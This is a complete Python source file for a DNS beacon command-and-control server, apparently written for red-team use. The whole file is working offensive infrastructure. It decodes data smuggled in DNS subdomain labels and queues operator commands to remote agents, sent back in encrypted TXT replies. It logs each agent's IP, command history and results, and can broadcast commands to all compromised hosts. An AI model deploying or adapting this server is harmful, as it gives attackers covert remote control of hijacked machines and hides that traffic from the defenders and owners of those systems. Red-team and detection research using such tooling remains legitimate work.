#Author: Lukasz Ozimek
#Email: lno5555@rit.edu

#!/usr/bin/env python3

#DNS Beacon C2 Server


# ── Standard library ──────────────────────────────────────────
import socket, threading, time, sys, os, base64, struct, hashlib, secrets
from collections import defaultdict
import platform as platform_module

# ── Platform detection ────────────────────────────────────────
IS_WINDOWS = platform_module.system() == 'Windows'

# ── Optional: Scapy (Linux packet sniffing) ───────────────────
SCAPY_AVAILABLE = False
if not IS_WINDOWS:
    try:
        from scapy.all import sniff, send
        from scapy.layers.dns import DNS, DNSQR, DNSRR
        from scapy.layers.inet import IP, UDP
        SCAPY_AVAILABLE = True
    except ImportError:
        pass

# ── Optional: pycryptodome (AES encryption) ───────────────────
AES_AVAILABLE = False
try:
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
    AES_AVAILABLE = True
except ImportError:
    pass

# ── Optional: rich (Better UI) ────────────────────
RICH_AVAILABLE = False
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.prompt import Prompt
    from rich import box
    RICH_AVAILABLE = True
    console = Console()
except ImportError:
    console = None

# ══════════════════════════════════════════════════════════════
#  CONFIGURATION
# ══════════════════════════════════════════════════════════════
DNS_SERVER_IP   = "0.0.0.0"
DNS_SERVER_PORT = 53

# Shared AES key — must match the client exactly.
# Generate a fresh one:  python3 -c "import secrets; print(secrets.token_hex(32))"
SHARED_KEY = "CHANGEME_use_python3_secrets_token_hex_32_here_000000000000000000"

# ── Runtime state ─────────────────────────────────────────────
client_queues    = defaultdict(list)
client_last_seen = {}
client_metadata  = {}
log_buffer       = []
verbose_logging  = False


# ══════════════════════════════════════════════════════════════
#  ENCRYPTION
# ══════════════════════════════════════════════════════════════

def _derive_key(key: str) -> bytes:
    return hashlib.sha256(key.encode()).digest()


def encrypt_message(plaintext: str) -> str:
    """AES-256-GCM encrypt to base64. Falls back to plain base64."""
    if not AES_AVAILABLE:
        return base64.b64encode(plaintext.encode()).decode()
    key    = _derive_key(SHARED_KEY)
    nonce  = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    ct, tag = cipher.encrypt_and_digest(plaintext.encode())
    return base64.b64encode(nonce + tag + ct).decode()


def decrypt_message(encoded: str):
    """Decrypt and authenticate. Returns plaintext or None on failure."""
    if not AES_AVAILABLE:
        try:
            return base64.b64decode(encoded.encode()).decode()
        except Exception:
            return encoded
    try:
        raw    = base64.b64decode(encoded.encode())
        nonce  = raw[:16]
        tag    = raw[16:32]
        ct     = raw[32:]
        cipher = AES.new(_derive_key(SHARED_KEY), AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ct, tag).decode()
    except Exception:
        return None


# ══════════════════════════════════════════════════════════════
#  DNS HELPERS
# ══════════════════════════════════════════════════════════════

def decode_subdomain(domain: str) -> str:
    """Base64-decode data encoded in subdomain labels."""
    parts = domain.rstrip('.').split('.')
    try:
        end    = parts.index('beacon')
        chunks = parts[:end]
    except ValueError:
        chunks = parts[:-3]
    encoded  = ''.join(chunks).replace('-', '+').replace('_', '/')
    encoded += '=' * ((4 - len(encoded) % 4) % 4)
    try:
        return base64.b64decode(encoded).decode()
    except Exception as e:
        return f"[decode error: {e}]"


def _parse_dns_query(data: bytes):
    """Return (domain, qtype) from raw UDP DNS bytes."""
    try:
        pos, labels = 12, []
        while data[pos] != 0:
            n = data[pos]; pos += 1
            labels.append(data[pos:pos+n].decode())
            pos += n
        qtype = struct.unpack('!H', data[pos+1:pos+3])[0]
        return '.'.join(labels), qtype
    except Exception:
        return None, None


def _build_dns_txt_response(query: bytes, txt: str) -> bytes:
    """Build a minimal DNS TXT response packet."""
    try:
        r = bytearray(query[:2])
        r.extend((0x8400).to_bytes(2, 'big'))
        r.extend((1).to_bytes(2, 'big'))
        r.extend((1).to_bytes(2, 'big'))
        r.extend((0).to_bytes(2, 'big'))
        r.extend((0).to_bytes(2, 'big'))
        pos = 12
        while query[pos] != 0:
            n = query[pos]
            r.extend(query[pos:pos+n+1])
            pos += n + 1
        r.append(0)
        pos += 1
        r.extend(query[pos:pos+4])
        r.extend(b'\xc0\x0c')
        r.extend((16).to_bytes(2, 'big'))
        r.extend((1).to_bytes(2, 'big'))
        r.extend((0).to_bytes(4, 'big'))
        td = txt.encode()
        r.extend((len(td)+1).to_bytes(2, 'big'))
        r.append(len(td))
        r.extend(td)
        return bytes(r)
    except Exception:
        return b''


def _build_scapy_response(pkt, txt: str):
    """Build a Scapy DNS TXT response packet."""
    qname = pkt[DNSQR].qname
    if isinstance(qname, bytes):
        qname = qname.decode()
    return (
        IP(dst=pkt[IP].src, src=pkt[IP].dst) /
        UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) /
        DNS(id=pkt[DNS].id, qr=1, aa=1, rd=1, ra=1,
            qd=pkt[DNS].qd,
            an=DNSRR(rrname=qname, type='TXT',
                     rdata=txt.encode(), ttl=0))
    )


# ══════════════════════════════════════════════════════════════
#  CORE BEACON LOGIC
# ══════════════════════════════════════════════════════════════

def _update_metadata(client_id: str, client_ip: str):
    if client_id not in client_metadata:
        client_metadata[client_id] = {
            'ip': client_ip,
            'first_seen': time.time(),
            'beacon_count': 0,
            'last_command': None,
            'last_result': None,
            'commands_executed': 0,
        }
    client_metadata[client_id]['beacon_count'] += 1
    client_metadata[client_id]['ip'] = client_ip


def _log(message: str, force=False):
    ts    = time.strftime("%H:%M:%S")
    entry = f"[{ts}] {message}"
    log_buffer.append(entry)
    if len(log_buffer) > 200:
        log_buffer.pop(0)
    if verbose_logging or force:
        if RICH_AVAILABLE:
            if "BEACON" in message:
                console.print(f"[dim blue]{entry}[/dim blue]")
            elif "SEND" in message:
                console.print(f"[bold yellow]{entry}[/bold yellow]")
            elif "RESULT" in message:
                console.print(f"[green]{entry}[/green]")
            elif "ERR" in message or "failed" in message.lower():
                console.print(f"[bold red]{entry}[/bold red]")
            else:
                console.print(f"[dim]{entry}[/dim]")
        else:
            sys.stdout.write('\r' + ' '*80 + '\r')
            print(entry)
            sys.stdout.write('c2> ')
            sys.stdout.flush()


def process_beacon(encoded_payload: str, client_ip: str) -> str:
    """Decrypt, process beacon, return encrypted response."""
    plaintext = decrypt_message(encoded_payload)
    if plaintext is None:
        _log(f"Decryption failed from {client_ip} — wrong key or tampered", force=True)
        return encrypt_message("ERR:DECRYPT")

    parts     = plaintext.split(maxsplit=2)
    msg_type  = parts[0].upper() if parts else ""
    client_id = parts[1] if len(parts) > 1 else "unknown"

    client_last_seen[client_id] = time.time()
    _update_metadata(client_id, client_ip)

    if msg_type == "BEACON":
        _log(f"BEACON from '{client_id}' ({client_ip})")
        if client_queues[client_id]:
            cmd = client_queues[client_id].pop(0)
            _log(f"SEND '{cmd}' → '{client_id}'", force=True)
            client_metadata[client_id]['last_command']       = cmd
            client_metadata[client_id]['commands_executed'] += 1
            return encrypt_message(f"CMD:{cmd}")
        return encrypt_message("NOP")

    elif msg_type == "RESULT":
        result = parts[2] if len(parts) > 2 else "[empty]"
        _log(f"RESULT from '{client_id}': {result[:120]}", force=True)
        client_metadata[client_id]['last_result'] = result[:500]
        if client_queues[client_id]:
            cmd = client_queues[client_id].pop(0)
            _log(f"SEND '{cmd}' → '{client_id}'", force=True)
            client_metadata[client_id]['last_command']       = cmd
            client_metadata[client_id]['commands_executed'] += 1
            return encrypt_message(f"CMD:{cmd}")
        return encrypt_message("NOP")

    return encrypt_message("NOP")


# ══════════════════════════════════════════════════════════════
#  TRANSPORT THREADS
# ══════════════════════════════════════════════════════════════
def _socket_server():
    """Raw-socket DNS server (Windows or no-Scapy fallback)."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind((DNS_SERVER_IP, DNS_SERVER_PORT))
    except Exception as e:
        _p(f"[red]Bind failed: {e}[/red]", f"Bind failed: {e}")
        _p("[yellow]Run as Administrator (Windows) or sudo (Linux)[/yellow]",
           "Run as Administrator / sudo")
        return
    _p("[green]Socket server listening[/green]", "Socket server listening")
    while True:
        try:
            data, addr = sock.recvfrom(4096)
            domain, qtype = _parse_dns_query(data)
            if not domain or qtype != 16 or 'beacon' not in domain.lower():
                continue
            encoded  = decode_subdomain(domain)
            response = process_beacon(encoded, addr[0])
            pkt      = _build_dns_txt_response(data, response)
            if pkt:
                sock.sendto(pkt, addr)
        except Exception as e:
            if verbose_logging:
                _p(f"[dim]Socket error: {e}[/dim]", f"Socket error: {e}")


def _scapy_handler(pkt):
    """Scapy per-packet callback."""
    if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0 and pkt.haslayer(DNSQR)):
        return
    if pkt[DNSQR].qtype != 16:
        return
    qname = pkt[DNSQR].qname
    if isinstance(qname, bytes):
        qname = qname.decode()
    if 'beacon' not in qname.lower():
        return
    encoded  = decode_subdomain(qname)
    response = process_beacon(encoded, pkt[IP].src)
    send(_build_scapy_response(pkt, response), verbose=0)


def _scapy_server():
    """Scapy sniff-based server (Linux)."""
    _p("[green]Scapy server listening[/green]", "Scapy server listening")
    try:
        sniff(filter=f"udp and port {DNS_SERVER_PORT}",
              prn=_scapy_handler, store=0)
    except Exception as e:
        _p(f"[red]Scapy failed: {e} — falling back to socket mode[/red]",
           f"Scapy failed, falling back: {e}")
        _socket_server()


# ══════════════════════════════════════════════════════════════
#  UI HELPERS
# ══════════════════════════════════════════════════════════════

def _p(rich_str: str, plain_str: str = ""):
    """Print with rich markup or plain fallback."""
    if RICH_AVAILABLE:
        console.print(rich_str)
    else:
        print(plain_str or rich_str)



def _print_banner():
    """Print Startup banner"""
    plat = f"{platform_module.system()} {platform_module.release()}"
    mode = ("Socket/Windows" if IS_WINDOWS
            else "Scapy/Linux" if SCAPY_AVAILABLE
            else "Socket/Fallback")
    enc  = (f"AES-256-GCM   key: {SHARED_KEY[:8]}...{SHARED_KEY[-4:]}"
            if AES_AVAILABLE else "DISABLED  (pip install pycryptodome)")

    if RICH_AVAILABLE:
        banner = (
            "\n"
            "    ╔══════════════════════════════════════════════════════════╗\n"
            "    ║                                                          ║\n"
            "    ║      DNS Beacon C2 Server  ·  Universal Edition         ║\n"
            "    ║                                                          ║\n"
            "    ╚══════════════════════════════════════════════════════════╝\n"
        )
        console.print(Panel(banner, style="bold cyan", box=box.DOUBLE))
        console.print(f"[cyan]Platform  :[/cyan] {plat}")
        console.print(f"[cyan]Listen    :[/cyan] {DNS_SERVER_IP}:{DNS_SERVER_PORT}")
        console.print(f"[cyan]Mode      :[/cyan] {mode}")
        if AES_AVAILABLE:
            console.print(f"[cyan]Encryption:[/cyan] [green]{enc}[/green]")
        else:
            console.print(f"[cyan]Encryption:[/cyan] [red]{enc}[/red]")
        console.print(f"[cyan]Status    :[/cyan] [green]● LISTENING[/green]\n")
    else:
        print("="*60)
        print("DNS Beacon C2 Server - Universal Edition")
        print("="*60)
        print(f"Platform:   {plat}")
        print(f"Listen:     {DNS_SERVER_IP}:{DNS_SERVER_PORT}")
        print(f"Mode:       {mode}")
        print(f"Encryption: {enc}")
        print("="*60 + "\n")


def _show_agents():
    """List agents that are connected or previously connected"""
    if not client_last_seen:
        _p("[yellow]No agents connected yet[/yellow]", "No agents connected yet")
        return

    if RICH_AVAILABLE:
        t = Table(title="Connected Agents", box=box.ROUNDED,
                  header_style="bold magenta")
        t.add_column("Status",       width=10)
        t.add_column("Agent ID",     style="cyan",    width=22)
        t.add_column("IP Address",   style="blue",    width=16)
        t.add_column("Last Seen",    style="green",   width=10)
        t.add_column("Beacons",      justify="right", style="yellow",  width=8)
        t.add_column("Cmds",         justify="right", style="magenta", width=6)
        t.add_column("Queued",       justify="right", style="red",     width=7)
        t.add_column("Last Command", style="dim",     width=28)

        for cid, ls in sorted(client_last_seen.items(),
                               key=lambda x: x[1], reverse=True):
            ago  = int(time.time() - ls)
            meta = client_metadata.get(cid, {})
            if ago < 10:   status = "[green]● ACTIVE[/green]"
            elif ago < 30: status = "[yellow]● IDLE[/yellow]"
            else:          status = "[red]● DEAD[/red]"
            last_cmd = meta.get('last_command') or '-'
            if len(last_cmd) > 28:
                last_cmd = last_cmd[:25] + "..."
            t.add_row(
                status, cid,
                meta.get('ip', '?'),
                f"{ago}s" if ago < 60 else f"{ago//60}m",
                str(meta.get('beacon_count', 0)),
                str(meta.get('commands_executed', 0)),
                str(len(client_queues.get(cid, []))) or "-",
                last_cmd,
            )
        console.print(t)
        console.print()
    else:
        print("\nConnected Agents:")
        print("-"*90)
        for cid, ls in sorted(client_last_seen.items(),
                               key=lambda x: x[1], reverse=True):
            ago  = int(time.time() - ls)
            meta = client_metadata.get(cid, {})
            st   = "ACTIVE" if ago < 10 else "IDLE  " if ago < 30 else "DEAD  "
            print(f"  [{st}] {cid:22s} | {meta.get('ip','?'):15s} | "
                  f"{ago:4d}s | {meta.get('beacon_count',0):4d} beacons | "
                  f"{len(client_queues.get(cid,[])):2d} queued")
        print("-"*90 + "\n")


def _show_info(cid: str):
    """Show info about connected agents; status, IP, commands sends, number of beacons"""
    if cid not in client_last_seen:
        _p(f"[red]Agent '{cid}' not found[/red]", f"Agent '{cid}' not found")
        return
    meta = client_metadata.get(cid, {})
    ago  = int(time.time() - client_last_seen[cid])
    if ago < 10:   status = "[green]● ACTIVE[/green]"
    elif ago < 30: status = "[yellow]● IDLE[/yellow]"
    else:          status = "[red]● DEAD[/red]"

    if RICH_AVAILABLE:
        info = (
            f"[bold cyan]Agent ID:[/bold cyan]          {cid}\n"
            f"[bold cyan]Status:[/bold cyan]            {status}\n"
            f"[bold cyan]IP Address:[/bold cyan]        {meta.get('ip','?')}\n"
            f"[bold cyan]Last Seen:[/bold cyan]         {ago}s ago\n"
            f"[bold cyan]First Seen:[/bold cyan]        "
            f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(meta.get('first_seen',0)))}\n"
            f"[bold cyan]Total Beacons:[/bold cyan]     {meta.get('beacon_count',0)}\n"
            f"[bold cyan]Commands Executed:[/bold cyan] {meta.get('commands_executed',0)}\n"
            f"[bold cyan]Queued Commands:[/bold cyan]   {len(client_queues.get(cid,[]))}"
        )
        console.print(Panel(info, title=f"[bold]Agent · {cid}[/bold]",
                            border_style="cyan", box=box.ROUNDED))
        if meta.get('last_command'):
            console.print("\n[bold yellow]Last Command:[/bold yellow]")
            console.print(Panel(meta['last_command'],
                                border_style="yellow", box=box.ROUNDED))
        if meta.get('last_result'):
            result = meta['last_result']
            if len(result) > 600:
                result = result[:600] + "\n... (truncated)"
            console.print("\n[bold green]Last Result:[/bold green]")
            console.print(Panel(result, border_style="green", box=box.ROUNDED))
        console.print()
    else:
        print(f"\nAgent: {cid}")
        print(f"  Status:   {'ACTIVE' if ago<10 else 'IDLE' if ago<30 else 'DEAD'}")
        print(f"  IP:       {meta.get('ip','?')}")
        print(f"  Last seen:{ago}s ago")
        print(f"  Beacons:  {meta.get('beacon_count',0)}")
        print(f"  Commands: {meta.get('commands_executed',0)}")
        if meta.get('last_command'):
            print(f"  Last cmd: {meta['last_command']}")
        if meta.get('last_result'):
            print(f"  Last result:\n    {meta['last_result'][:300]}")
        print()


def _show_logs(n: int = 20):
    """Show log of previous commands"""
    if not log_buffer:
        _p("[yellow]No logs yet[/yellow]", "No logs yet")
        return
    if RICH_AVAILABLE:
        console.print(f"\n[bold cyan]Last {n} log entries:[/bold cyan]\n")
        for e in log_buffer[-n:]:
            if   "BEACON" in e: console.print(f"[dim blue]{e}[/dim blue]")
            elif "SEND"   in e: console.print(f"[bold yellow]{e}[/bold yellow]")
            elif "RESULT" in e: console.print(f"[green]{e}[/green]")
            elif "ERR" in e or "failed" in e.lower():
                console.print(f"[bold red]{e}[/bold red]")
            else:               console.print(f"[dim]{e}[/dim]")
        console.print()
    else:
        print(f"\nLast {n} logs:")
        for e in log_buffer[-n:]:
            print(e)
        print()


def _show_stats():
    """Show stats of connected agents; Executed commands, queued commands, beacons"""
    total   = len(client_last_seen)
    active  = sum(1 for ls in client_last_seen.values() if time.time()-ls < 30)
    beacons = sum(m.get('beacon_count', 0) for m in client_metadata.values())
    cmds    = sum(m.get('commands_executed', 0) for m in client_metadata.values())
    queued  = sum(len(q) for q in client_queues.values())

    if RICH_AVAILABLE:
        txt = (
            f"[bold cyan]Total Agents:[/bold cyan]      {total}\n"
            f"[bold green]Active Agents:[/bold green]     {active}\n"
            f"[bold yellow]Beacons Received:[/bold yellow]  {beacons}\n"
            f"[bold magenta]Commands Executed:[/bold magenta] {cmds}\n"
            f"[bold red]Queued Commands:[/bold red]    {queued}\n"
            f"[bold blue]Log Entries:[/bold blue]       {len(log_buffer)}\n"
            f"[bold cyan]Encryption:[/bold cyan]        "
            f"{'[green]AES-256-GCM[/green]' if AES_AVAILABLE else '[red]DISABLED[/red]'}"
        )
        console.print(Panel(txt, title="[bold]Server Statistics[/bold]",
                            border_style="cyan", box=box.DOUBLE))
        console.print()
    else:
        print(f"\nStats — agents:{total}  active:{active}  beacons:{beacons}  "
              f"cmds:{cmds}  queued:{queued}  "
              f"enc:{'AES-256-GCM' if AES_AVAILABLE else 'off'}\n")


def _show_help():
    """List commands if you forget"""
    rows = [
        ("queue <targets> <cmd>",        "Queue a command for agent(s)"),
        ("  queue web-01 WHOAMI",        "  → single agent"),
        ("  queue web-01,db-01 WHOAMI",  "  → comma-separated list"),
        ("  queue all WHOAMI",           "  → every known agent"),
        ("  queue active WHOAMI",        "  → agents active in last 30s"),
        ("", ""),
        ("agents / list",               "Agent table with status"),
        ("info <agent>",                "Full detail panel"),
        ("show <agent>",                "Pending command queue"),
        ("clear <agent>",               "Clear pending queue"),
        ("", ""),
        ("logs [N]",                    "Show last N log lines (default 20)"),
        ("stats",                       "Statistics dashboard"),
        ("verbose [on|off]",            "Toggle live log printing"),
        ("keygen",                      "Generate new random shared key"),
        ("", ""),
        ("exit / quit",                 "Stop server"),
    ]
    if RICH_AVAILABLE:
        t = Table(title="Available Commands", box=box.ROUNDED,
                  header_style="bold magenta")
        t.add_column("Command",     style="cyan",  width=35)
        t.add_column("Description", style="white", width=45)
        for c, d in rows:
            t.add_row(c, d)
        console.print(t)
        console.print()
    else:
        print("\nCommands:")
        for c, d in rows:
            if c:
                print(f"  {c:35s} {d}")
        print()


# ══════════════════════════════════════════════════════════════
#  CONSOLE INTERFACE
# ══════════════════════════════════════════════════════════════

def _queue_for(targets: list, command: str):
    """Queue a command to be executed"""
    for cid in targets:
        client_queues[cid.strip()].append(command)
    if RICH_AVAILABLE:
        ids = "[cyan]" + ", ".join(targets) + "[/cyan]"
        console.print(f"[green]✓[/green] Queued [yellow]{command!r}[/yellow] "
                      f"for {len(targets)} agent(s): {ids}")
    else:
        print(f"✓ Queued {command!r} for: {', '.join(targets)}")


def console_interface():
    """Main console interface logic, accepting commands and executing commands in the C2 agent"""
    global verbose_logging

    _print_banner()
    _p("[bold green]Type 'help' for commands[/bold green]\n",
       "Type 'help' for commands\n")

    while True:
        try:
            if RICH_AVAILABLE:
                raw = Prompt.ask("[bold cyan]c2[/bold cyan]")
            else:
                sys.stdout.write("c2> ")
                sys.stdout.flush()
                raw = input().strip()

            if not raw:
                continue

            parts  = raw.split(maxsplit=2)
            action = parts[0].lower()

            if action in ('exit', 'quit', 'q'):
                _p("\n[yellow]Shutting down...[/yellow]", "\nShutting down...")
                os._exit(0)

            elif action == 'queue' and len(parts) >= 3:
                target_str = parts[1]
                command    = parts[2]

                if target_str.lower() == 'all':
                    targets = list(client_last_seen.keys())
                    if not targets:
                        _p("[yellow]No agents connected[/yellow]", "No agents connected")
                    else:
                        _queue_for(targets, command)

                elif target_str.lower() == 'active':
                    targets = [c for c, ls in client_last_seen.items()
                               if time.time() - ls < 30]
                    if not targets:
                        _p("[yellow]No active agents[/yellow]", "No active agents")
                    else:
                        _queue_for(targets, command)
                else:
                    targets = [t.strip() for t in target_str.split(',') if t.strip()]
                    _queue_for(targets, command)

            elif action in ('agents', 'list'):
                _show_agents()

            elif action == 'info' and len(parts) >= 2:
                _show_info(parts[1])

            elif action == 'show' and len(parts) >= 2:
                cid = parts[1]
                q   = list(client_queues.get(cid, []))
                if q:
                    if RICH_AVAILABLE:
                        t = Table(title=f"Queue · {cid}", box=box.SIMPLE,
                                  header_style="bold yellow")
                        t.add_column("#",       style="dim", width=4)
                        t.add_column("Command", style="cyan")
                        for i, c in enumerate(q, 1):
                            t.add_row(str(i), c)
                        console.print(t)
                        console.print()
                    else:
                        print(f"\nQueue for '{cid}':")
                        for i, c in enumerate(q, 1):
                            print(f"  {i}. {c}")
                        print()
                else:
                    _p(f"[yellow]No queued commands for '{cid}'[/yellow]",
                       f"No queue for '{cid}'")

            elif action == 'clear' and len(parts) >= 2:
                cid = parts[1]
                n   = len(client_queues.get(cid, []))
                client_queues[cid].clear()
                _p(f"[green]✓[/green] Cleared {n} command(s) for '{cid}'",
                   f"✓ Cleared {n} commands for '{cid}'")

            elif action == 'logs':
                n = int(parts[1]) if len(parts) > 1 else 20
                _show_logs(n)

            elif action == 'stats':
                _show_stats()

            elif action == 'verbose':
                if len(parts) > 1:
                    verbose_logging = parts[1].lower() == 'on'
                else:
                    verbose_logging = not verbose_logging
                state = "ON" if verbose_logging else "OFF"
                _p(f"[green]✓[/green] Verbose: [yellow]{state}[/yellow]",
                   f"✓ Verbose: {state}")

            elif action == 'keygen':
                key = secrets.token_hex(32)
                if RICH_AVAILABLE:
                    console.print(Panel(
                        f"[bold green]{key}[/bold green]\n\n"
                        "[dim]Set as SHARED_KEY in both server and client.[/dim]",
                        title="[bold]New Shared Key[/bold]",
                        border_style="green", box=box.ROUNDED))
                else:
                    print(f"\n  New key: {key}")
                    print("  → Set as SHARED_KEY in server AND client.\n")

            elif action == 'help':
                _show_help()

            else:
                _p("[red]Unknown command.[/red] Type [cyan]help[/cyan].",
                   "Unknown command. Type 'help'.")

        except (KeyboardInterrupt, EOFError):
            _p("\n\n[yellow]Shutting down...[/yellow]", "\n\nShutting down...")
            os._exit(0)
        except Exception as e:
            _p(f"[red]Error: {e}[/red]", f"Error: {e}")

# ══════════════════════════════════════════════════════════════
#  ENTRY POINT
# ══════════════════════════════════════════════════════════════

def start_server():
    """Start the server. Ready to Red Team"""
    if IS_WINDOWS or not SCAPY_AVAILABLE:
        t = threading.Thread(target=_socket_server, daemon=True)
    else:
        t = threading.Thread(target=_scapy_server, daemon=True)
    t.start()
    time.sleep(0.5)
    console_interface()


if __name__ == "__main__":
    start_server()
